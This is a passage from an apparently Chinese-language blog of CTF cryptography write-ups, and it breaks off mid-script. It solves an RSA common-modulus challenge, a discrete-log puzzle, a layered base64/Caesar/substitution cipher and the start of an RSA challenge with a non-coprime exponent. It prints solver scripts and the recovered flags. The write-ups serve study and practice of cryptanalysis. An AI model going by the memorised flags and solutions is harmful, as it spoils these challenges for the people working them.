mtight">1</span></span></span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mathdefault mtight">c</span><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span>。</p><p>代入<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mn>1</mn><mo>∗</mo><mi>s</mi><mn>1</mn><mo>+</mo><mi>e</mi><mn>2</mn><mo>∗</mo><mi>s</mi><mn>2</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e1*s1+e2*s2=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">s</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，得到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><msup><mn>1</mn><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>s</mi><mn>2</mn></mrow></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mn>1</mn></msup><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">(c1^{s1}*c2^{s2}) mod n=(m^1) mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span>，再推出$(c1<sup>{s1}*c2</sup>{s2}) mod n = m mod n。</p><p>最後可得出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><msup><mn>1</mn><mrow><mi>s</mi><mn>1</mn></mrow></msup><mo>∗</mo><mi>c</mi><msup><mn>2</mn><mrow><mi>s</mi><mn>2</mn></mrow></msup><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">c1^{s1}*c2^{s2} = m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commonModulusAttack</span>(<span class="params">n, c1, c2, e1, e2</span>): <span class="comment"># 共模攻擊腳本</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> a, <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x, y = egcd(b, a % b)</span><br><span class="line">            <span class="keyword">return</span> y, x - (a // b) * y</span><br><span class="line"></span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">0</span>]</span><br><span class="line">    s2 = s[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(n, e1) = (</span><br><span class="line">    <span class="number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span>,</span><br><span class="line">    <span class="number">773</span>)</span><br><span class="line">(n, e2) = (</span><br><span class="line">    <span class="number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span>,</span><br><span class="line">    <span class="number">839</span>)</span><br><span class="line">c1 = <span class="number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span></span><br><span class="line">c2 = <span class="number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span></span><br><span class="line"></span><br><span class="line">result = commonModulusAttack(n, c1, c2, e1, e2)</span><br><span class="line"><span class="built_in">print</span>(result)   <span class="comment"># 1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span></span><br><span class="line"><span class="comment"># flag=long_to_bytes(result)</span></span><br><span class="line">result = <span class="built_in">str</span>(result)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(result):</span><br><span class="line">    <span class="keyword">if</span> result[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        c = <span class="built_in">chr</span>(<span class="built_in">int</span>(result[i:i + <span class="number">3</span>]))</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = <span class="built_in">chr</span>(<span class="built_in">int</span>(result[i:i + <span class="number">2</span>]))</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    flag += c</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>另外這一題一開始將結果轉bytes，但發現不能轉，觀察可以發現是分組的ascii，把字串切割解出flag。</p><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;whenwethinkitispossible&#125;</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2020-青龙组you_raise_me_up"><a class="markdownIt-Anchor" href="#网鼎杯-2020-青龙组you_raise_me_up"></a> [网鼎杯 2020 青龙组]you_raise_me_up</h3><p>題目如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n-<span class="number">1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br></pre></td></tr></table></figure><p>求離散對數問題，直接硬解。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line"></span><br><span class="line">fl = sympy.discrete_log(n, c, m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(fl))</span><br></pre></td></tr></table></figure><p>取得flag。</p><h3 id="utctf2020basic-crypto"><a class="markdownIt-Anchor" href="#utctf2020basic-crypto"></a> [UTCTF2020]basic-crypto</h3><p>題目給定如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>八個二進為一組，感覺起來就是byte，寫一下轉碼腳本。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;G:\\project\\buuctf\\attachment.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">line = f.readline()</span><br><span class="line">byte = <span class="built_in">str</span>.split(line)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> byte:</span><br><span class="line">    <span class="built_in">str</span>+=long_to_bytes(<span class="built_in">int</span>(i,base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>輸出以下內容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&quot;Uh-oh, looks like we have another block of text, with some sort of special encoding. Can you figure out what this encoding is? (hint: if you look carefully, you&#x27;ll notice that there only characters present are A-Z, a-z, 0-9, and sometimes / and +. See if you can find an encoding that looks like this one.)\nTmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBsb29rcyBsaWtlIHRoZSBsZXR0ZXJzIGFyZSBzaGlmdGVkIGJ5IHNvbWUgY29uc3RhbnQuIChoaW50OiB5b3UgbWlnaHQgd2FudCB0byBzdGFydCBsb29raW5nIHVwIFJvbWFuIHBlb3BsZSkuCmt2YnNxcmQsIGl5ZSdibyBrdnd5Y2QgZHJvYm8hIFh5ZyBweWIgZHJvIHBzeGt2IChreG4gd2tpbG8gZHJvIHJrYm5vY2QuLi4pIHprYmQ6IGsgY2VsY2RzZGVkc3l4IG1zenJvYi4gU3ggZHJvIHB5dnZ5Z3N4cSBkb2hkLCBTJ2ZvIGRrdW94IHdpIHdvY2NrcW8ga3huIGJvenZrbW9uIG9mb2JpIGt2enJrbG9kc20gbXJrYmttZG9iIGdzZHIgayBteWJib2N6eXhub3htbyBkeSBrIG5zcHBvYm94ZCBtcmtia21kb2IgLSB1eHlneCBrYyBrIGNlbGNkc2RlZHN5eCBtc3pyb2IuIE1reCBpeWUgcHN4biBkcm8gcHN4a3YgcHZrcT8gcnN4ZDogR28gdXh5ZyBkcmtkIGRybyBwdmtxIHNjIHF5c3hxIGR5IGxvIHlwIGRybyBweWJ3a2QgZWRwdmtxey4uLn0gLSBncnNtciB3b2t4YyBkcmtkIHNwIGl5ZSBjb28gZHJrZCB6a2Rkb2J4LCBpeWUgdXh5ZyBncmtkIGRybyBteWJib2N6eXhub3htb2MgcHliIGUsIGQsIHAsIHYgaywga3huIHEga2JvLiBJeWUgbWt4IHpieWxrbHZpIGd5YnUgeWVkIGRybyBib3drc3hzeHEgbXJrYmttZG9iYyBsaSBib3p2a21zeHEgZHJvdyBreG4gc3hwb2Jic3hxIG15d3d5eCBneWJuYyBzeCBkcm8gT3hxdnNjciB2a3hxZWtxby4gS3h5ZHJvYiBxYm9rZCB3b2RyeW4gc2MgZHkgZWNvIHBib2Flb3htaSBreGt2aWNzYzogZ28gdXh5ZyBkcmtkICdvJyBjcnlnYyBleiB3eWNkIHlwZG94IHN4IGRybyBrdnpya2xvZCwgY3kgZHJrZCdjIHpieWxrbHZpIGRybyB3eWNkIG15d3d5eCBtcmtia21kb2Igc3ggZHJvIGRvaGQsIHB5dnZ5Z29uIGxpICdkJywga3huIGN5IHl4LiBZeG1vIGl5ZSB1eHlnIGsgcG9nIG1ya2JrbWRvYmMsIGl5ZSBta3ggc3hwb2IgZHJvIGJvY2QgeXAgZHJvIGd5Ym5jIGxrY29uIHl4IG15d3d5eCBneWJuYyBkcmtkIGNyeWcgZXogc3ggZHJvIE94cXZzY3Igdmt4cWVrcW8uCnJnaG54c2RmeXNkdGdodSEgcWdmIGlzYWsgY3RodHVpa2UgZGlrIHprbnRoaGt4IHJ4cWxkZ254c2xpcSByaXN5eWtobmsuIGlreGsgdHUgcyBjeXNuIGNneCBzeXkgcWdmeCBpc3hlIGtjY2d4ZHU6IGZkY3lzbntoMHZfZGk0ZHVfdmk0ZF90X3I0eXlfcnhxbGQwfS4gcWdmIHZ0eXkgY3RoZSBkaXNkIHMgeWdkIGdjIHJ4cWxkZ254c2xpcSB0dSBwZnVkIHpmdHlldGhuIGdjYyBkaXR1IHVneGQgZ2MgenN1dHIgYmhndnlrZW5rLCBzaGUgdGQgeGtzeXlxIHR1IGhnZCB1ZyB6c2Ugc2Nka3ggc3l5LiBpZ2xrIHFnZiBraHBncWtlIGRpayByaXN5eWtobmsh&quot;</span><br></pre></td></tr></table></figure><p>接下來依據提示猜出是base64，破解後得到下一串亂碼。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">New challenge! Can you figure out what&#x27;s going on here? It looks like the letters are shifted by some constant. (hint: you might want to start looking up Roman people).</span><br><span class="line"></span><br><span class="line">kvbsqrd, iye&#x27;bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S&#x27;fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq&#123;...&#125; - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd &#x27;o&#x27; crygc ez wycd ypdox sx dro kvzrklod, cy drkd&#x27;c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li &#x27;d&#x27;, kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo.rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn&#123;h0v_di4du_vi4d_t_r4yy_rxqld0&#125;. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!&quot;</span><br></pre></td></tr></table></figure><p>原本以為是簡單的凱撒密碼(rot13)，做完發現不是，丟 <a href="https://quipqiup.com/">https://quipqiup.com/</a> 做詞頻分析，找到下一步做法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alright, you&#x27;re almost there! Now for the final (and maybe the hardest...) part: a substitution cipher. </span><br><span class="line"></span><br><span class="line">In the following tezt, I&#x27;ve taken my message and replaced every alphabetic character with a correspondence to a different character - known as a substitution cipher. </span><br><span class="line"></span><br><span class="line">Can you find the final flag? hint: We know that the flag is going to be of the format utflag&#123;...&#125; - which means that if you see that pattern, you know what the correspondences for u, t, f, l a, and g are. </span><br><span class="line"></span><br><span class="line">You can probably work out the remaining characters by replacing them and inferring common words in the English language. </span><br><span class="line"></span><br><span class="line">Another great method is to use frequency analysis: we know that &#x27;e&#x27; shows up most often in the alphabet, so that&#x27;s probably the most common character in the tezt, followed by &#x27;t&#x27;, and so on. </span><br><span class="line"></span><br><span class="line">Once you know a few characters, you can infer the rest of the words based on common words that show up in the English language.</span><br><span class="line"></span><br><span class="line">hwzdnitvoitjwzk! gwv yiqa sjzjkyau tya padjzzan hngbtwdnibyg hyiooazda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid&#123;z0l_ty4tk_ly4t_j_h4oo_hngbt0&#125;. gwv ljoo sjzu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujzd wss tyjk kwnt ws pikjh rzwloauda, izu jt naioog jk zwt kw piu istan ioo. ywba gwv azfwgau tya hyiooazda!</span><br></pre></td></tr></table></figure><p>取最後一行，輸入 vtsoid=utflag 條件後再讓他繼續跑詞頻分析。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">utflag&#123;n0w_th4ts_wh4t_i_c4ll_crypt0&#125;. you will find that a lot of cryptography is just building off this sort of basic knowledge, and it really is not so bad after all. hope you enjoyed the challenge!</span><br></pre></td></tr></table></figure><p>flag{n0w_th4ts_wh4t_i_c4ll_crypt0}</p><h3 id="npuctf2020ezrsa"><a class="markdownIt-Anchor" href="#npuctf2020ezrsa"></a> [NPUCTF2020]EzRSA</h3><p>題目給定如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm , powmod , invert , gcd , mpz</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">gift = lcm(p - <span class="number">1</span> , q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">54722</span></span><br><span class="line">flag = <span class="string">b&#x27;NPUCTF&#123;******************&#125;&#x27;</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag , <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c = powmod(m , e , n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n: &#x27;</span> , n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift: &#x27;</span> , gift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c: &#x27;</span> , c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n:  17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span></span><br><span class="line"><span class="comment">#gift:  2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span></span><br><span class="line"><span class="comment">#c:  3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span></span><br></pre></td></tr></table></figure><p>題目給定的資訊有n, c, e 和 p-1 與 q-1 的最小公倍數。</p><p>先用factordb分解n，就可以找到p, q了。</p><p>由於e和phi不互質，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">gcd(e, phi) = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>。</p><p>所以將<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">c = m^e mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span>變形成<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>m</mi><mn>2</mn></msup><msup><mo stretchy="false">)</mo><mi>e</mi></msup><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">c = ((m^2)^e/2) mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mord">/</span><span class="mord">2</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span>，把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">m^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>當成密文，解密出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>m</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">m^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>之後再開根號得到flag就好了。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span 